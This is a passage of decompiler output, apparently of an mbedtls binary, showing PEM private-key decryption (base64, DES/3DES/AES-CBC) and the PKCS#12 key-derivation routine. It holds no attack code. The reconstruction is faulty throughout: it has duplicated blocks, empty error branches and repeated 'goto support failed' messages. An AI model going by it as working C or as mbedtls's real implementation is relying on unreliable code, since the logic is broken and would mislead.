                                        v33 = v4 - v35;
                                        v23 = &size;
                                        mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                        g4 = v23;
                                        if (&size == (int32_t *)-44) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8063bff
                                        mem = calloc(1, size);
                                        g7 = (int32_t)mem;
                                        if (mem == NULL) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8063c27
                                        if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                            // 0x8063c60
                                            if (a5 == 0) {
                                                // 0x8064028
                                                free((char *)g7);
                                                // branch -> 0x8063aa4
                                            } else {
                                                // 0x8063c6a
                                                v34 = g5;
                                                if (v34 == 37) {
                                                    // 0x8063f95
                                                    g5 = &v29;
                                                    mbedtls_des3_init((char *)&v29);
                                                    v25 = &v28;
                                                    g4 = v25;
                                                    g6 = 24;
                                                    v26 = &v32;
                                                    g1 = v26;
                                                    pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                    mbedtls_des3_set3key_dec(g5, v26);
                                                    g4 = v26;
                                                    v37 = g7;
                                                    mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                    mbedtls_des3_free((char *)g5);
                                                    *(char *)v26 = 0;
                                                    v22 = v26 + 1;
                                                    // branch -> 0x8064015
                                                    while (v22 != v25) {
                                                        // 0x8064015
                                                        *(char *)v22 = 0;
                                                        v22++;
                                                        // continue -> 0x8064015
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x8063c73
                                                    if (v34 == 33) {
                                                        // 0x8063ed2
                                                        g5 = &v27;
                                                        mbedtls_des_init((char *)&v27);
                                                        g4 = &v28;
                                                        v24 = &v32;
                                                        g1 = v24;
                                                        g6 = 8;
                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                        mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                        v36 = g7;
                                                        mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                        mbedtls_des_free((char *)g5);
                                                        *(char *)v24 = 0;
                                                        v21 = v24 + 1;
                                                        // branch -> 0x8063f4c
                                                        while (v21 != (int32_t)&v31) {
                                                            // 0x8063f4c
                                                            *(char *)v21 = 0;
                                                            v21++;
                                                            // continue -> 0x8063f4c
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x8063c7c
                                                        if (v34 == 5) {
                                                            // 0x8063eaa
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 16;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        } else {
                                                            // 0x8063c86
                                                            if (v34 == 6) {
                                                                // 0x8063f5b
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 24;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            } else {
                                                                // 0x8063c8f
                                                                if (v34 == 7) {
                                                                    // 0x8063c94
                                                                    g1 = &v28;
                                                                    g4 = g7;
                                                                    g5 = a5;
                                                                    g6 = 32;
                                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                    // branch -> 0x8063cb7
                                                                }
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            // 0x8064042
                                            free((char *)g7);
                                            // branch -> 0x8063aa4
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                }
                                // 0x8063cf8
                                // branch -> 0x8063aa4
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        } else {
                            // 0x8063e1c
                            if (g5 == 0) {
                                // 0x8063dec
                                // branch -> 0x8063aa4
                            } else {
                                // 0x8063e1c
                                v50 = g7;
                                // branch -> 0x8063e22
                                // 0x8063e22
                                v48 = *(char *)v50;
                                v52 = v50;
                                v51 = v48;
                                if (v48 == 13) {
                                    // 0x8063e29
                                    v43 = v50 + 1;
                                    g7 = v43;
                                    v52 = v43;
                                    v51 = (int32_t)*(char *)v43;
                                    // branch -> 0x8063e2f
                                }
                                // 0x8063e2f
                                if (v51 == 10) {
                                    // 0x8063e37
                                    v35 = v52 + 1;
                                    // branch -> 0x8063bac
                                    // 0x8063bac
                                    if (v4 != v35) {
                                        // 0x8063bb8
                                        v33 = v4 - v35;
                                        v23 = &size;
                                        mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                        g4 = v23;
                                        if (&size == (int32_t *)-44) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8063bff
                                        mem = calloc(1, size);
                                        g7 = (int32_t)mem;
                                        if (mem == NULL) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8063c27
                                        if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                            // 0x8063c60
                                            if (a5 == 0) {
                                                // 0x8064028
                                                free((char *)g7);
                                                // branch -> 0x8063aa4
                                            } else {
                                                // 0x8063c6a
                                                v34 = g5;
                                                if (v34 == 37) {
                                                    // 0x8063f95
                                                    g5 = &v29;
                                                    mbedtls_des3_init((char *)&v29);
                                                    v25 = &v28;
                                                    g4 = v25;
                                                    g6 = 24;
                                                    v26 = &v32;
                                                    g1 = v26;
                                                    pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                    mbedtls_des3_set3key_dec(g5, v26);
                                                    g4 = v26;
                                                    v37 = g7;
                                                    mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                                    mbedtls_des3_free((char *)g5);
                                                    *(char *)v26 = 0;
                                                    v22 = v26 + 1;
                                                    // branch -> 0x8064015
                                                    while (v22 != v25) {
                                                        // 0x8064015
                                                        *(char *)v22 = 0;
                                                        v22++;
                                                        // continue -> 0x8064015
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x8063c73
                                                    if (v34 == 33) {
                                                        // 0x8063ed2
                                                        g5 = &v27;
                                                        mbedtls_des_init((char *)&v27);
                                                        g4 = &v28;
                                                        v24 = &v32;
                                                        g1 = v24;
                                                        g6 = 8;
                                                        pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                        mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                        v36 = g7;
                                                        mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                        mbedtls_des_free((char *)g5);
                                                        *(char *)v24 = 0;
                                                        v21 = v24 + 1;
                                                        // branch -> 0x8063f4c
                                                        while (v21 != (int32_t)&v31) {
                                                            // 0x8063f4c
                                                            *(char *)v21 = 0;
                                                            v21++;
                                                            // continue -> 0x8063f4c
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x8063c7c
                                                        if (v34 == 5) {
                                                            // 0x8063eaa
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 16;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        } else {
                                                            // 0x8063c86
                                                            if (v34 == 6) {
                                                                // 0x8063f5b
                                                                g1 = &v28;
                                                                g4 = g7;
                                                                g5 = a5;
                                                                g6 = 24;
                                                                pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                // branch -> 0x8063cb7
                                                            } else {
                                                                // 0x8063c8f
                                                                if (v34 == 7) {
                                                                    // 0x8063c94
                                                                    g1 = &v28;
                                                                    g4 = g7;
                                                                    g5 = a5;
                                                                    g6 = 32;
                                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                                    // branch -> 0x8063cb7
                                                                }
                                                            }
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            // 0x8064042
                                            free((char *)g7);
                                            // branch -> 0x8063aa4
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                }
                                // 0x8063cf8
                                // branch -> 0x8063aa4
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                        // 0x8063e22
                        v48 = *(char *)v50;
                        v52 = v50;
                        v51 = v48;
                        if (v48 == 13) {
                            // 0x8063e29
                            v43 = v50 + 1;
                            g7 = v43;
                            v52 = v43;
                            v51 = (int32_t)*(char *)v43;
                            // branch -> 0x8063e2f
                        }
                        // 0x8063e2f
                        if (v51 == 10) {
                            // 0x8063e37
                            v35 = v52 + 1;
                            // branch -> 0x8063bac
                            // 0x8063bac
                            if (v4 != v35) {
                                // 0x8063bb8
                                v33 = v4 - v35;
                                v23 = &size;
                                mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                                g4 = v23;
                                if (&size == (int32_t *)-44) {
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                                // 0x8063bff
                                mem = calloc(1, size);
                                g7 = (int32_t)mem;
                                if (mem == NULL) {
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                                // 0x8063c27
                                if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                                    // 0x8063c60
                                    if (a5 == 0) {
                                        // 0x8064028
                                        free((char *)g7);
                                        // branch -> 0x8063aa4
                                    } else {
                                        // 0x8063c6a
                                        v34 = g5;
                                        if (v34 == 37) {
                                            // 0x8063f95
                                            g5 = &v29;
                                            mbedtls_des3_init((char *)&v29);
                                            v25 = &v28;
                                            g4 = v25;
                                            g6 = 24;
                                            v26 = &v32;
                                            g1 = v26;
                                            pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                            mbedtls_des3_set3key_dec(g5, v26);
                                            g4 = v26;
                                            v37 = g7;
                                            mbedtls_des3_crypt_cbc(g5, 0, (char)size, &v28, v37, v37);
                                            mbedtls_des3_free((char *)g5);
                                            *(char *)v26 = 0;
                                            v22 = v26 + 1;
                                            // branch -> 0x8064015
                                            while (v22 != v25) {
                                                // 0x8064015
                                                *(char *)v22 = 0;
                                                v22++;
                                                // continue -> 0x8064015
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            // 0x8063c73
                                            if (v34 == 33) {
                                                // 0x8063ed2
                                                g5 = &v27;
                                                mbedtls_des_init((char *)&v27);
                                                g4 = &v28;
                                                v24 = &v32;
                                                g1 = v24;
                                                g6 = 8;
                                                pem_pbkdf1((char *)a5, a6, v23, v35, v33);
                                                mbedtls_des_setkey_dec((int32_t *)g5, v24);
                                                v36 = g7;
                                                mbedtls_des_crypt_cbc(g5, 0, (char)size, &v28, v36, v36);
                                                mbedtls_des_free((char *)g5);
                                                *(char *)v24 = 0;
                                                v21 = v24 + 1;
                                                // branch -> 0x8063f4c
                                                while (v21 != (int32_t)&v31) {
                                                    // 0x8063f4c
                                                    *(char *)v21 = 0;
                                                    v21++;
                                                    // continue -> 0x8063f4c
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                // 0x8063c7c
                                                if (v34 == 5) {
                                                    // 0x8063eaa
                                                    g1 = &v28;
                                                    g4 = g7;
                                                    g5 = a5;
                                                    g6 = 16;
                                                    pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                    // branch -> 0x8063cb7
                                                } else {
                                                    // 0x8063c86
                                                    if (v34 == 6) {
                                                        // 0x8063f5b
                                                        g1 = &v28;
                                                        g4 = g7;
                                                        g5 = a5;
                                                        g6 = 24;
                                                        pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                        // branch -> 0x8063cb7
                                                    } else {
                                                        // 0x8063c8f
                                                        if (v34 == 7) {
                                                            // 0x8063c94
                                                            g1 = &v28;
                                                            g4 = g7;
                                                            g5 = a5;
                                                            g6 = 32;
                                                            pem_aes_decrypt(size, a5, a6, v35, v33, v30);
                                                            // branch -> 0x8063cb7
                                                        }
                                                    }
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                } else {
                                    // 0x8064042
                                    free((char *)g7);
                                    // branch -> 0x8063aa4
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        }
                        // 0x8063cf8
                        // branch -> 0x8063aa4
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                    // 0x8063e12
                    // branch -> 0x8063aa4
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
            } else {
                // 0x8063ba0
                g5 = 0;
                v35 = str4;
                // branch -> 0x8063bac
                // 0x8063bac
                if (v4 != v35) {
                    // 0x8063bb8
                    v33 = v4 - v35;
                    v23 = &size;
                    mbedtls_base64_decode(NULL, 0, &size, v35, v33);
                    g4 = v23;
                    if (&size == (int32_t *)-44) {
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                    // 0x8063bff
                    mem = calloc(1, size);
                    g7 = (int32_t)mem;
                    if (mem == NULL) {
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                    // 0x8063c27
                    if (mbedtls_base64_decode(mem, size, &size, v35, v33) == 0) {
                        // 0x806403a
                        // branch -> 0x8063cd6
                        // Detected a possible infinite recursion (goto support failed); quitting...
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    } else {
                        // 0x8064042
                        free((char *)g7);
                        // branch -> 0x8063aa4
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
            }
            // 0x8063cf8
            // branch -> 0x8063aa4
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
    }
    // 0x8063aca
    g3 = v1;
    g7 = v2;
    g5 = v3;
    return -0x1080;
}

// Address range: 0x8064060 - 0x80644cf
int32_t mbedtls_pkcs12_derivation(char * a1, uint32_t a2, char * a3, uint32_t a4, int32_t a5, char * a6, int32_t a7, uint32_t a8, uint32_t a9, int32_t a10) {
    int32_t v1 = g7; // 0x8064069
    g7 = a4;
    int32_t v2 = g3; // 0x806406f
    int32_t v3 = (int32_t)a6;
    g4 = v3;
    int32_t v4 = g5; // 0x8064075
    int32_t result; // 0x8064082
    if (a4 >= 65 || a2 > 128 || a6 > (char *)64) {
        // 0x806407d
        g3 = -0x1f80;
        // branch -> 0x8064082
        // 0x8064082
        result = g3;
        g7 = v1;
        g3 = v2;
        g5 = v4;
        return result;
    }
    // 0x80640a6
    g3 = -0x1f00;
    int32_t v5 = mbedtls_md_info_from_type(a7); // 0x80640b7
    if (v5 == 0) {
        // 0x8064082
        result = g3;
        g7 = v1;
        g3 = v2;
        g5 = v4;
        return result;
    }
    // 0x80640c6
    int32_t v6;
    int32_t v7 = &v6; // 0x80640c6_0
    mbedtls_md_init(&v6);
    g3 = v5;
    g1 = v7;
    int32_t v8 = mbedtls_md_setup(&v6, v5, 0); // 0x80640ef
    g3 = v7;
    if (v8 == 0) {
        // 0x80640fa
        int32_t v9;
        int32_t v10 = &v9; // 0x8064100_0
        g5 = v10;
        mbedtls_md_get_size(v5);
        int32_t v11;
        int32_t v12 = &v11 < (int32_t *)33 ? -64 : 0; // 0x806411c
        int32_t v13 = v12 + 128; // 0x806411f
        int32_t v14;
        int32_t v15 = &v14; // 0x8064136_0
        memset((char *)&v14, a8 % 256, v13);
        int32_t v16 = g7; // 0x806415a
        int32_t v17 = v3; // 0x8064173
        int32_t v18 = v13; // 0x8064178
        int32_t v19 = g5;
        // branch -> 0x806416e
        while (true) {
            int32_t v20 = v18 > v17 ? v17 : v18; // 0x8064178
            memcpy((char *)v19, (char *)a5, v20);
            if (v18 == v20) {
                int32_t v21 = &v11; // 0x806410e_0
                int32_t v22;
                int32_t v23 = &v22; // 0x80641aa_0
                g7 = v16;
                int32_t v24 = v13; // 0x80641d2
                char * v25 = (char *)&v22;
                // branch -> 0x80641c8
                while (true) {
                    int32_t v26 = v24 > v16 ? v16 : v24; // 0x80641d2
                    memcpy(v25, a3, v26);
                    g4 = v23;
                    if (v24 == v26) {
                        // 0x806420a
                        int32_t v27; // 0x8064343
                        int32_t v28; // 0x8064353
                        int32_t v29; // 0x8064363
                        int32_t v30; // 0x8064373
                        int32_t v31;
                        int32_t v32;
                        int32_t v33;
                        int32_t v34;
                        int32_t v35; // 0x806434e
                        if (a2 == 0) {
                            // 0x80644b6
                            // branch -> 0x806433c
                        } else {
                            int32_t v36 = &v31; // 0x806421d_0
                            g3 = v36;
                            int32_t v37 = &v32; // 0x8064220_0
                            int32_t v38 = mbedtls_md_starts(&v6); // 0x806424456
                            g4 = v23;
                            int32_t v39 = v38; // 0x806433a
                            if (v38 == 0) {
                                char * v40 = (char *)(v12 + 127 + v37); // 0x8064439_0
                                // branch -> 0x8064257
                              lab_0x8064257:
                                while (true) {
                                    // 0x8064257
                                    g3 = v13;
                                    int32_t v41 = mbedtls_md_update(&v6, v15, v13); // 0x8064271
                                    g4 = v23;
                                    if (v41 == 0) {
                                        int32_t v42 = g3; // 0x8064284
                                        g3 = v7;
                                        int32_t v43 = mbedtls_md_update(&v6, g5, v42); // 0x8064292
                                        g4 = v23;
                                        if (v43 == 0) {
                                            int32_t v44 = mbedtls_md_update((int32_t *)g3, v23, v13); // 0x80642b6
                                            g4 = v23;
                                            if (v44 == 0) {
                                                // 0x80642c5
                                                g3 = v36;
                                                int32_t v45 = mbedtls_md_finish(&v6, v36); // 0x80642d5
                                                g4 = v23;
                                                g3 = v7;
                                                if (v45 == 0) {
                                                    // 0x80642e6
                                                    if (a9 >= 2) {
                                                        // 0x80642f0
                                                        g7 = 1;
                                                        // branch -> 0x8064304
                                                        while (true) {
                                                            int32_t v46 = mbedtls_md(v5, v36, v21, v36); // 0x806432b
                                                            g4 = v23;
                                                            if (v46 == 0) {
                                                                int32_t v47 = g7 + 1; // 0x80642f8
                                                                g7 = v47;
                                                                if (v47 >= a9) {
                                                                    // break -> 0x806438b
                                                                    break;
                                                                }
                                                                // continue -> 0x8064304
                                                                continue;
                                                            } else {
                                                                // 0x806433a
                                                                g3 = v46;
                                                                // branch -> 0x806433c
                                                            }
                                                            // 0x806433c
                                                            *(char *)v10 = 0;
                                                            v27 = v10 + 1;
                                                            // branch -> 0x8064340
                                                            while (v27 != v15) {
                                                                // 0x8064340
                                                                *(char *)v27 = 0;
                                                                v27++;
                                                                // continue -> 0x8064340
                                                            }
                                                            // 0x806434e
                                                            v35 = g4;
                                                            *(char *)v35 = 0;
                                                            v28 = v35 + 1;
                                                            // branch -> 0x8064350
                                                            while (v28 != g5) {
                                                                // 0x8064350
                                                                *(char *)v28 = 0;
                                                                v28++;
                                                                // continue -> 0x8064350
                                                            }
                                                            // 0x806435a
                                                            v33 = (int32_t)(char *)&v32;
                                                            *(char *)v33 = 0;
                                                            v29 = v33 + 1;
                                                            // branch -> 0x8064360
                                                            while (v29 != g4) {
                                                                // 0x8064360
                                                                *(char *)v29 = 0;
                                                                v29++;
                                                                // continue -> 0x8064360
                                                            }
                                                            // 0x806436a
                                                            v34 = (int32_t)(char *)&v31;
                                                            g1 = v34;
                                                            *(char *)v34 = 0;
                                                            v30 = g1 + 1;
                                                            g1 = v30;
                                                            // branch -> 0x8064370
                                                            while (v30 != v7) {
                                                                // 0x8064370
                                                                *(char *)v30 = 0;
                                                                v30 = g1 + 1;
                                                                g1 = v30;
                                                                // continue -> 0x8064370
                                                            }
                                                            // 0x806437e
                                                            mbedtls_md_free((char *)&v6);
                                                            // branch -> 0x8064082
                                                            // 0x8064082
                                                            result = g3;
                                                            g7 = v1;
                                                            g3 = v2;
                                                            g5 = v4;
                                                            return result;
                                                        }
                                                    }
                                                    int32_t v48 = v21; // 0x80643a4
                                                    if (a2 <= v21) {
                                                        // if_8064394_0_true
                                                        v48 = a2;
                                                        // branch -> after_if_8064394_0
                                                    }
                                                    // after_if_8064394_0
                                                    memcpy(a1, (char *)&v31, v48);
                                                    g4 = v23;
                                                    if (a2 != v48) {
                                                        int32_t v49 = v37; // 0x80643f9
                                                        // branch -> 0x80643e1
                                                        while (true) {
                                                            int32_t v50 = v21; // ebx
                                                            int32_t v51 = v21; // 0x8064405
                                                            if (v13 <= v21) {
                                                                // if_80643f6_0_true
                                                                v50 = v13;
                                                                v51 = v13;
                                                                // branch -> after_if_80643f6_0
                                                            }
                                                            // after_if_80643f6_0
                                                            memcpy((char *)v49, (char *)&v31, v51);
                                                            g4 = v23;
                                                            int32_t v52 = v50 + v49; // 0x806441e
                                                            int32_t v53 = v13; // 0x8064420
                                                            int32_t v54 = v53 - v50; // 0x8064420
                                                            v13 = v54;
                                                            if (v53 == v50) {
                                                                // break -> 0x8064424
                                                                break;
                                                            }
                                                            v49 = v52;
                                                            v13 = v54;
                                                            // continue -> 0x80643e1
                                                        }
                                                        // 0x8064424
                                                        *v40 = *v40 + 1;
                                                        int32_t v55 = 0; // 0x8064459
                                                        // branch -> 0x8064450
                                                        while (true) {
                                                            int32_t v56 = v13 - 1; // 0x8064456
                                                            int32_t v57 = v56; // eax
                                                            unsigned char v58 = *(char *)(v56 + v37); // 0x806445c
                                                            char * v59 = (char *)(g5 + v56); // 0x8064460_0
                                                            uint32_t v60 = (int32_t)v58 + v55 % 256 + (int32_t)*v59; // 0x8064467
                                                            int32_t v61 = v60 / 256; // edx
                                                            *v59 = (char)v60;
                                                            if (v56 == 0) {
                                                                int32_t v62 = 0; // 0x8064489
                                                                // branch -> 0x8064480
                                                                while (true) {
                                                                    int32_t v63 = v13 - 1; // 0x8064486
                                                                    v57 = v63;
                                                                    int32_t v64 = (int32_t)*(char *)(v63 + v37); // 0x806448c
                                                                    g7 = v64;
                                                                    char * v65 = (char *)(g4 + v63); // 0x8064490_0
                                                                    uint32_t v66 = v64 + v62 % 256 + (int32_t)*v65; // 0x8064497
                                                                    v61 = v66 / 256;
                                                                    *v65 = (char)v66;
                                                                    if (v63 == 0) {
                                                                        // 0x80644a5
                                                                        g3 = v48;
                                                                        int32_t v67 = g4; // 0x806423b
                                                                        int32_t v68 = mbedtls_md_starts(&v6); // 0x8064244
                                                                        g4 = v67;
                                                                        if (v68 != 0) {
                                                                            v39 = v68;
                                                                            // break (via goto) -> 0x806433a
                                                                            goto lab_0x806433a;
                                                                        }
                                                                        v23 = v67;
                                                                        a1 = (char *)(v48 + (int32_t)a1);
                                                                        a2 -= v48;
                                                                        // continue (via goto) -> 0x8064257
                                                                        goto lab_0x8064257;
                                                                    } else {
                                                                        // 0x8064480
                                                                        v62 = v61;
                                                                        v13 = v57;
                                                                        // branch -> 0x8064480
                                                                        continue;
                                                                    }
                                                                }
                                                                // 0x806433a
                                                                g3 = v39;
                                                                char * v69 = (char *)&v32;
                                                                char * v70 = (char *)&v31;
                                                                // branch -> 0x806433c
                                                                // 0x806433c
                                                                v57 = v10;
                                                                int32_t v71 = v10; // 0x8064340
                                                                *(char *)v71 = 0;
                                                                int32_t v72 = v57; // 0x8064343
                                                                v27 = v72 + 1;
                                                                v57 = v27;
                                                                // branch -> 0x8064340
                                                                while (v27 != v15) {
                                                                    // 0x8064340
                                                                    v71 = v27;
                                                                    *(char *)v71 = 0;
                                                                    v72 = v57;
                                                                    v27 = v72 + 1;
                                                                    v57 = v27;
                                                                    // continue -> 0x8064340
                                                                }
                                                                // 0x806434e
                                                                v35 = g4;
                                                                v57 = v35;
                                                                int32_t v73 = v35; // 0x8064350
                                                                *(char *)v73 = 0;
                                                                int32_t v74 = v57; // 0x8064353
                                                                v28 = v74 + 1;
                                                                v57 = v28;
                                                                // branch -> 0x8064350
                                                                while (v28 != g5) {
                                                                    // 0x8064350
                                                                    v73 = v28;
                                                                    *(char *)v73 = 0;
                                                                    v74 = v57;
                                                                    v28 = v74 + 1;
                                                                    v57 = v28;
                                                                    // continue -> 0x8064350
                                                                }
                                                                // 0x806435a
                                                                v33 = (int32_t)v69;
                                                                v57 = v33;
                                                                int32_t v75 = v33; // 0x8064360
                                                                *(char *)v75 = 0;
                                                                int32_t v76 = v57; // 0x8064363
                                                                v29 = v76 + 1;
                                                                v57 = v29;
                                                                // branch -> 0x8064360
                                                                while (v29 != g4) {
                                                                    // 0x8064360
                                                                    v75 = v29;
                                                                    *(char *)v75 = 0;
                                                                    v76 = v57;
                                                                    v29 = v76 + 1;
                                                                    v57 = v29;
                                                                    // continue -> 0x8064360
                                                                }
                                                                // 0x806436a
                                                                v34 = (int32_t)v70;
                                                                g1 = v34;
                                                                int32_t v77 = v34; // 0x8064370
                                                                *(char *)v77 = 0;
                                                                int32_t v78 = g1; // 0x8064373
                                                                v30 = v78 + 1;
                                                                g1 = v30;
                                                                // branch -> 0x8064370
                                                                while (v30 != v7) {
                                                                    // 0x8064370
                                                                    v77 = v30;
                                                                    *(char *)v77 = 0;
                                                                    v78 = g1;
                                                                    v30 = v78 + 1;
                                                                    g1 = v30;
                                                                    // continue -> 0x8064370
                                                                }
                                                                // 0x806437e
                                                                mbedtls_md_free((char *)&v6);
                                                                // branch -> 0x8064082
                                                                // 0x8064082
                                                                result = g3;
                                                                g7 = v1;
                                                                g3 = v2;
                                                                g5 = v4;
                                                                return result;
                                                            }
                                                            // 0x8064450
                                                            v55 = v61;
                                                            v13 = v57;
                                                            // branch -> 0x8064450
                                                        }
                                                    }
                                                }
                                                // 0x806433c
                                                *(char *)v10 = 0;
                                                v27 = v10 + 1;
                                                // branch -> 0x8064340
                                                while (v27 != v15) {
                                                    // 0x8064340
                                                    *(char *)v27 = 0;
                                                    v27++;
                                                    // continue -> 0x8064340
                                                }
                                                // 0x806434e
                                                v35 = g4;
                                                *(char *)v35 = 0;
                                                v28 = v35 + 1;
                                                // branch -> 0x8064350
                                                while (v28 != g5) {
                                                    // 0x8064350
                                                    *(char *)v28 = 0;
                                                    v28++;
                                                    // continue -> 0x8064350
                                                }
                                                // 0x806435a
                                                v33 = (int32_t)(char *)&v32;
                                                *(char *)v33 = 0;
                                                v29 = v33 + 1;
                                                // branch -> 0x8064360
                                                while (v29 != g4) {
                                                    // 0x8064360
                                                    *(char *)v29 = 0;
                                                    v29++;
                                                    // continue -> 0x8064360
                                                }
                                                // 0x806436a
                                                v34 = (int32_t)(char *)&v31;
                                                g1 = v34;
                                                *(char *)v34 = 0;
                                                v30 = g1 + 1;
                                                g1 = v30;
                                                // branch -> 0x8064370
                                                while (v30 != v7) {
                                                    // 0x8064370
                                                    *(char *)v30 = 0;
                                                    v30 = g1 + 1;
                                                    g1 = v30;
                                                    // continue -> 0x8064370
                                                }
                                                // 0x806437e
                                                mbedtls_md_free((char *)&v6);
                                                // branch -> 0x8064082
                                                // 0x8064082
                                                result = g3;
                                                g7 = v1;
                                                g3 = v2;
                                                g5 = v4;
                                                return result;
                                            }
                                            v39 = v44;
                                        } else {
                                            v39 = v43;
                                        }
                                    } else {
                                        v39 = v41;
                                    }
                                }
                            }
                          lab_0x806433a:
                            // 0x806433a
                            g3 = v39;
                            // branch -> 0x806433c
                        }
                        // 0x806433c
                        *(char *)v10 = 0;
                        v27 = v10 + 1;
                        // branch -> 0x8064340
                        while (v27 != v15) {
                            // 0x8064340
                            *(char *)v27 = 0;
                            v27++;
                            // continue -> 0x8064340
                        }
                        // 0x806434e
                        v35 = g4;
                        *(char *)v35 = 0;
                        v28 = v35 + 1;
                        // branch -> 0x8064350
                        while (v28 != g5) {
                            // 0x8064350
                            *(char *)v28 = 0;
                            v28++;
                            // continue -> 0x8064350
                        }
                        // 0x806435a
                        v33 = (int32_t)(char *)&v32;
                        *(char *)v33 = 0;
                        v29 = v33 + 1;
                        // branch -> 0x8064360
                        while (v29 != g4) {
                            // 0x8064360
                            *(char *)v29 = 0;
                            v29++;
                            // continue -> 0x8064360
                        }
                        // 0x806436a
                        v34 = (int32_t)(char *)&v31;
                        g1 = v34;
                        *(char *)v34 = 0;
                        v30 = g1 + 1;
                        g1 = v30;
                        // branch -> 0x8064370
                        while (v30 != v7) {
                            // 0x8064370
                            *(char *)v30 = 0;
                            v30 = g1 + 1;
                            g1 = v30;
                            // continue -> 0x8064370
                        }
                        // 0x806437e
                        mbedtls_md_free((char *)&v6);
                        // branch -> 0x8064082
                        // 0x8064082
                        result = g3;
                        g7 = v1;
                        g3 = v2;
                        g5 = v4;
                        return result;
                    }
                    // after_if_80641cf_0.dec_label_pc_80641c8_crit_edge
                    v16 = g7;
                    v24 -= v26;
                    v25 = (char *)(v26 + (int32_t)v25);
                    // branch -> 0x80641c8
                }
            } else {
                // after_if_8064175_0.dec_label_pc_806416e_crit_edge
                v17 = v3;
                v18 -= v20;
                v19 += v20;
                // branch -> 0x806416e
                continue;
            }
        }
    }
    // 0x8064082
    result = g3;
    g7 = v1;
    g3 = v2;
    g5 = v4;
    return result;
}

// Address range: 0x80644d0 - 0x806470f
int32_t pkcs12_pbe_derive_key_iv(uint32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = g5; // 0x80644d3
    int32_t v2 = g7; // 0x80644d4
    int32_t v3 = g3; // 0x80644d5
